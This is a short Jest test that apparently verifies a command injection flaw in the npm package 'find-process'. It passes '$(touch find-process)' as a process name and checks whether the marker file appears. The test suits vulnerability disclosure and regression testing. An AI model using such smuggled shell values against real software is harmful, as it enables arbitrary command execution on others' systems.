test("Command Injection in find-process", () => {
  expect.assertions(1);
  const find = require("find-process");
  const fs = require("fs");
  const path = "./find-process";
  const command = "$(touch find-process)";
  return find("pid", command).then(
    function (list) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    },
    function (err) {
      console.log(err.stack || err);
    }
  );
});
